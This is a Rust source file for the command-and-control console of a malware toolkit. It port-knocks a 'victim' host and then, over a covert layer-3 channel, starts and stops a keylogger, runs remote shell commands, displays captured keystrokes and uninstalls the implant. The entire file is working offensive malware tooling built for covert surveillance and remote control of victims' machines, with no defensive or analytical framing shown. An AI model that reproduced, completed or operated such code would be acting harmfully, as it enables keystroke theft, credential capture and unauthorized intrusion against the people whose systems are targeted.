use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use std::sync::atomic::Ordering;
use pnet::datalink;

mod port_knkr;
mod pcap_capture;
mod keylogger;
mod covert;

use port_knkr::KnockSession;
use pcap_capture::PcapHandle;
use covert::CovertChannel;

// CRITICAL: Ensure these match the Victim's command codes exactly
const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    pcap_handle: Option<PcapHandle>,
    covert_chan: Option<CovertChannel>,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            pcap_handle: None,
            covert_chan: None,
        }
    }

    pub fn run(&mut self) {
        println!("=== C2 Server (Layer 3) ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n--- Status: Offline ---");
        println!("1) Initiate session (Port Knock)");
        println!("0) Exit");

        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!(
            "\n--- Status: Connected to {} ---",
            self.victim_ip.map(|ip| ip.to_string()).unwrap_or("Unknown".into())
        );
        println!("1) Disconnect from victim");
        println!("2) Uninstall from victim");
        println!("3) Start keylogger on victim");
        println!("4) Stop keylogger on victim");
        println!("5) Run shell command on victim");
        println!("6) View Captured Keys");

        match prompt("Selection > ").as_str() {
            "1" => self.disconnect(),
            "2" => self.uninstall(),
            "3" => self.start_keylogger(),
            "4" => self.stop_keylogger(),
            "5" => self.run_program(),
            "6" => self.view_keylog(),
            _   => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
        let target_ip = if ip_input.is_empty() { 
            "127.0.0.1".parse::<Ipv4Addr>().unwrap() 
        } else {
            match ip_input.parse::<Ipv4Addr>() {
                Ok(ip) => ip,
                Err(_) => { println!("[!] Invalid IP"); return; }
            }
        };

        match port_knkr::port_knock(target_ip) {
            Ok(session) => {
                println!("[+] Port knock successful.");
                self.victim_ip = Some(target_ip);
                
                let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
                let interfaces = datalink::interfaces();
                let interface = interfaces.into_iter().find(|i| i.name == iface_name).expect("Interface not found");
                
                let local_ip = interface.ips.iter()
                    .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
                    .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

                // Initialize L3 Covert Channel
                let (chan, rx) = CovertChannel::new(
                    &interface, target_ip, local_ip, session.tx_port, session.rx_port 
                );

                // Start the listener to print keys to stdout as they arrive
                covert::start_listening(rx, chan.config.clone(), chan.running.clone());

                self.covert_chan = Some(chan);
                self.knock_session = Some(session);
                self.state = SessionState::Connected;
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn start_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending 'START' signal (Burst Mode)...");
            // Burst sending is critical because packets can be dropped in covert channels
            for i in 1..=5 {
                chan.send_byte(CMD_START_LOGGER);
                thread::sleep(Duration::from_millis(20));
                print!("."); io::stdout().flush().unwrap();
            }
            println!("\n[+] Start command sent.");
        }
    }

    fn stop_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending 'STOP' signal...");
            for _ in 0..3 { // Small burst for reliability
                chan.send_byte(CMD_STOP_LOGGER);
                thread::sleep(Duration::from_millis(20));
            }
            println!("[+] Stop command sent.");
        }
    }

    fn view_keylog(&self) {
        // Since start_listening() prints keys to the terminal in real-time,
        // this function serves as a reminder to check your local storage/pcap logs.
        println!("\n--- Keylogger Status ---");
        println!("[*] Live keys should be appearing in your terminal from the listener thread.");
        
        let path = "./data/pcaps/captured_keys.txt";
        if std::path::Path::new(path).exists() {
            println!("[*] Local log file found at: {}", path);
            match std::fs::read_to_string(path) {
                Ok(content) => println!("\nStored Content:\n{}", content),
                Err(e) => println!("[!] Error reading file: {}", e),
            }
        } else {
            println!("[!] No local log file found yet.");
        }
    }

    fn run_program(&mut self) {
        let cmd = prompt("Remote Shell Command > ");
        if cmd.is_empty() { return; }

        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending command byte-by-byte...");
            chan.send_command(&cmd); 
            println!("[+] Command sent. Waiting for output from listener...");
        }
    }

    fn uninstall(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[!] Sending UNINSTALL command...");
            chan.send_byte(CMD_UNINSTALL);
            self.disconnect();
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Cleaning up session...");
        if let Some(ref chan) = self.covert_chan { chan.stop(); } 
        
        self.knock_session = None;
        self.covert_chan = None;
        self.state = SessionState::Disconnected;
        println!("[+] Session closed.");
    }

    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
        let interfaces = datalink::interfaces();
        for iface in interfaces {
            if !iface.is_up() || iface.is_loopback() { continue; }
            for ip_net in &iface.ips {
                if let IpAddr::V4(_) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target_ip)) { return Some(iface.name); }
                }
            }
        }
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
